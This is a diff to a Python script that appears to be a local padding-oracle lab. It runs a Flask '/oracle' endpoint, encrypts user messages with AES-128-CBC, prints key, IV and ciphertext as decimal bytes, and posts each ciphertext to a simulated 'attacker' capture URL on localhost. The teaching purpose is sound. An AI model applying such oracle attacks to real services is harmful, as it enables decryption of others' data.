@@ -21,7 +21,12 @@ SERVER_PORT = 5000
 ATTACKER_URL = "http://127.0.0.1:5001/capture"
 
 app = Flask(__name__)
-logging.getLogger("werkzeug").setLevel(logging.ERROR)  # hide flask logs
+logging.getLogger("werkzeug").setLevel(logging.ERROR)
+
+
+def fmt(data):
+    """Format bytes as space-separated decimal values."""
+    return " ".join(str(b) for b in data)
 
 
 @app.route("/oracle", methods=["POST"])
@@ -55,7 +60,6 @@ def oracle():
 
 
 def main():
-    # start flask in background thread
     t = threading.Thread(target=lambda: app.run(host="127.0.0.1", port=SERVER_PORT, threaded=True), daemon=True)
     t.start()
 
@@ -65,7 +69,7 @@ def main():
     print(f"  Algorithm  : AES-128-CBC")
     print(f"  Block size : {BLOCK_SIZE} bytes")
     print(f"  Padding    : PKCS#7")
-    print(f"  Key (hex)  : {KEY.hex()}")
+    print(f"  Key        : {fmt(KEY)}")
     print(f"  Oracle     : http://127.0.0.1:{SERVER_PORT}/oracle")
     print("=" * 50)
     print()
@@ -86,7 +90,6 @@ def main():
         if msg.lower() == "quit":
             break
 
-        # encrypt
         iv = os.urandom(BLOCK_SIZE)
         cipher = AES.new(KEY, AES.MODE_CBC, iv=iv)
         padded = pad(msg.encode(), BLOCK_SIZE)
@@ -94,14 +97,14 @@ def main():
         pad_count = len(padded) - len(msg.encode())
 
         print(f"\nPlaintext       : {msg}")
-        print(f"Plaintext bytes : {len(msg.encode())}")
-        print(f"PKCS#7 padding  : added {pad_count} bytes of value 0x{pad_count:02x}")
-        print(f"After padding   : {len(padded)} bytes ({len(padded)//BLOCK_SIZE} block(s))")
-        print(f"IV  (hex)       : {iv.hex()}")
-        print(f"CT  (hex)       : {ct.hex()}")
-        print(f"IV+CT (hex)     : {(iv+ct).hex()}")
+        print(f"Plaintext bytes : {fmt(msg.encode())}")
+        print(f"PKCS#7 padding  : added {pad_count} byte(s) of value {pad_count}")
+        print(f"After padding   : {fmt(padded)} ({len(padded)} bytes, {len(padded)//BLOCK_SIZE} block(s))")
+        print(f"IV              : {fmt(iv)}")
+        print(f"Ciphertext      : {fmt(ct)}")
+        print(f"IV + Ciphertext : {fmt(iv + ct)}")
 
-        # send to attacker
+        # send to attacker (hex is only used over the network, not shown to user)
         try:
             http_req.post(ATTACKER_URL, json={"ciphertext": (iv+ct).hex()}, timeout=3)
             print(f"Status          : Sent to attacker")
